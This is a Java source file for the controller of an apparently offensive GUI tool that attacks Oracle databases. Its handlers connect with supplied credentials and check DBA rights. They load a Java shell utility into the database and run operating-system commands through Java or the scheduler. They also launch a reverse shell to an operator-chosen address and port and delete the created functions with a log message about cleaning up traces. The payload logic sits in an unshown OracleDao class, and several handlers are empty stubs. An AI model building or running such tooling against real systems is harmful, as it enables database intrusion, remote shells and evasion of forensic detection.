package Controller;


import Dao.OracleDao;
import Entity.ControllersFactory;
import Util.MessageUtil;
import Util.Utils;
import javafx.application.Platform;
import javafx.beans.value.ObservableValue;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.*;
import javafx.scene.layout.HBox;
import org.json.JSONObject;

import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.ResourceBundle;

public class OracleController implements Initializable {

    @FXML
    private ComboBox<String> ComboBox_OracleTypeCode;

    @FXML
    private RadioButton RadioButton_JAVA;

    @FXML
    private RadioButton RadioButton_SCHEDULER;

    @FXML
    private Button Button_ReadPath;

    @FXML
    private Button Button_OracleCommandRun;

    @FXML
    private Button Button_DeleteFuction;

    @FXML
    private MenuItem MenuItem_normalupload;

    @FXML
    public TextArea oracleLogTextArea;

    @FXML
    private MenuItem CreateShellUtil;

    @FXML
    private TextField TextField_OracleCommand;

    @FXML
    private HBox HBox_Command;

    @FXML
    private TextField TextField_FilePath;

    @FXML
    private TreeView<?> TreeView_PathTree;

    @FXML
    private Button Button_Return;

    @FXML
    private ToggleGroup OracleCommandTypeGroup;

    @FXML
    public TextArea Textarea_OracleCommandResult;

    @FXML
    private TableView<?> TableView_Filetable;
    
    @FXML
    private MenuItem MenuItem_normaldeletefile;

    @FXML
    private MenuItem MenuItem_normalmkdir;

    @FXML
    private MenuButton MenuButton_CreateFunction;

    @FXML
    private Button reverseRunBtn;

    @FXML
    private TextField reversePortTextField;

    @FXML
    private TextField reverseAddressTextField;

    @FXML
    private ToggleGroup OracleReverseTypeGroup;

    @FXML
    private RadioButton reverseSchedulerRadioBtn;

    @FXML
    private RadioButton reverseJavaRadioBtn;
    /**
     * 存储从 MssqlDao 传递过来的 mssqlDao 使用
     */
    private OracleDao oracleDao;

    private JSONObject dataObj;

    /**
     * 存放 RadioButton 的 userData 值
     */
    private String userData = "";

    private String reverseUserData = "";

    private List workList = new ArrayList();

    public List getWorkList() {
        return this.workList;
    }

    public void initOraclelDao(JSONObject dbObj){
        this.dataObj = dbObj;
        oracleLogTextArea.appendText(Utils.log("正在连接..."));
    }


    @Override
    public void initialize(URL location, ResourceBundle resources) {
        // 初始化当前 controllers 。方便其他 controllers 调用
        ControllersFactory.controllers.put(this.getClass().getSimpleName(), this);

        // 初始化对应组件
        initComboBox();
        initToggleGroup();
        Runnable runner = () -> {
            try {
                this.oracleDao = new OracleDao(this.dataObj.getString("ipaddress"),this.dataObj.getString("port"),this.dataObj.getString("database"),this.dataObj.getString("username"),this.dataObj.getString("password"),this.dataObj.getString("timeout"));
                this.oracleDao.getConnection();
                Platform.runLater(() -> {
                    oracleLogTextArea.appendText(Utils.log("连接成功！"));
                    // 检查数据库账户权限
                    this.oracleDao.isDBA();
                    // 获取版本
                    this.oracleDao.getVersion();
                });
            }catch (Exception e){
                Platform.runLater(() -> {
                    oracleLogTextArea.appendText(Utils.log("连接失败！"));
                    MessageUtil.showExceptionMessage(e,e.getMessage());
                    try {
                        this.oracleDao.closeConnection();
                    }catch (Exception ex){
                    }
                });
            }
        };
        Thread workThrad = new Thread(runner);
        this.workList.add(workThrad);
        workThrad.start();
    }

    /**
     * 初始化 ToggleGroup 的 RadioButton 值
     */
    public void initToggleGroup(){

        RadioButton_JAVA.setUserData("java");
        RadioButton_SCHEDULER.setUserData("scheduler");
        reverseSchedulerRadioBtn.setUserData("schedulerreverse");
        reverseJavaRadioBtn.setUserData("javareverse");
        // 命令执行
        OracleCommandTypeGroup.selectedToggleProperty().addListener(
                (ObservableValue<? extends Toggle> ov, Toggle old_toggle,
                 Toggle new_toggle) -> {
                    if (OracleCommandTypeGroup.getSelectedToggle() != null) {
                        userData = OracleCommandTypeGroup.getSelectedToggle().getUserData().toString();
                        // 这里判断是否选择 scheduler 模式，scheduler 模式不需要编码和返回输出
                        // 只需要日志输出
                        if("scheduler".equals(userData)){
                            Textarea_OracleCommandResult.setText("该执行类型没有返回结果");
                            ComboBox_OracleTypeCode.setDisable(true);
                        }else {
                            Textarea_OracleCommandResult.setText("");
                            ComboBox_OracleTypeCode.setDisable(false);
                        }
                    }
                });
        // 反弹shell
        OracleReverseTypeGroup.selectedToggleProperty().addListener(
                (ObservableValue<? extends Toggle> ov, Toggle old_toggle,
                 Toggle new_toggle) -> {
                    if (OracleReverseTypeGroup.getSelectedToggle() != null) {
                        reverseUserData = OracleReverseTypeGroup.getSelectedToggle().getUserData().toString();
                    }
                });
    }
    /**
     * 初始化 ComboBox 组件
     */
    public void initComboBox(){
        // 编码
        ObservableList<String> OracleTypeCodeoptions = FXCollections.observableArrayList(
                "UTF-8",
                "GB2312",
                "GBK"
        );
        ComboBox_OracleTypeCode.setItems(OracleTypeCodeoptions);
    }

    @FXML
    void CreateShellUtil(ActionEvent event) {
        Runnable runner = () -> {
            Platform.runLater(() -> {
                oracleLogTextArea.appendText(Utils.log("正在初始化，请稍等..."));
            });
            this.oracleDao.importJAVA();
        };
        Thread workThrad = new Thread(runner);
        workThrad.start();
    }


    @FXML
    void ReverseShell(ActionEvent event) {

    }

    @FXML
    void DeleteFuction(ActionEvent event) {
        Runnable runner = () -> {
            Platform.runLater(() -> {
                oracleLogTextArea.appendText(Utils.log("正在清理痕迹，请稍等..."));
            });
            this.oracleDao.deleteFunction();
        };
        Thread workThrad = new Thread(runner);
        workThrad.start();
    }

    @FXML
    void OracleCommandRun(ActionEvent event) {
        // 编码
        String code = ComboBox_OracleTypeCode.getValue();
        String command = TextField_OracleCommand.getText();

        if(code == null && !"scheduler".equals(userData)){
            MessageUtil.showErrorMessage("错误","请选择编码！");
            return;
        }else if("".equals(command)){
            MessageUtil.showErrorMessage("错误","请输入命令！");
            return;
        }else if("".equals(userData)){
            MessageUtil.showErrorMessage("错误","请选择命令执行类型！");
            return;
        }
        Runnable runner = () -> {
            Platform.runLater(() -> {
                oracleLogTextArea.appendText(Utils.log("正在执行命令，请稍等..."));
            });
            String res = this.oracleDao.executeCommand(command,code,userData);
            if(!"".equals(res)){
                Platform.runLater(() -> {
                    Textarea_OracleCommandResult.setText(res);
                });
            }
        };
        Thread workThrad = new Thread(runner);
        workThrad.start();
    }

    @FXML
    void reverseRun(ActionEvent event) {
        if ("".equals(reverseAddressTextField)){
            MessageUtil.showErrorMessage("错误","请输入回连地址！");
            return;
        }else if("".equals(reversePortTextField)){
            MessageUtil.showErrorMessage("错误","请输入回连端口！");
            return;
        }else if("".equals(reverseUserData)){
            MessageUtil.showErrorMessage("错误","请选择回连模式！");
            return;
        }
        String ip = reverseAddressTextField.getText();
        String port = reversePortTextField.getText();
        if("javareverse".equals(reverseUserData)){
            Runnable runner = () -> {
                Platform.runLater(() -> {
                    oracleLogTextArea.appendText(Utils.log("正在执行反弹命令，请稍等..."));
                });
                this.oracleDao.reverseJavaShell(ip,port);
            };
            Thread workThrad = new Thread(runner);
            workThrad.start();
        }else {
            oracleLogTextArea.appendText(Utils.log("Scheduler 暂时不支持反弹！"));
        }
    }

    @FXML
    void ReadPath(ActionEvent event) {

    }

    @FXML
    void Return(ActionEvent event) {

    }

    @FXML
    void normalUpload(ActionEvent event) {

    }

    @FXML
    void normalDelete(ActionEvent event) {

    }

    @FXML
    void normalmkdir(ActionEvent event) {

    }
}
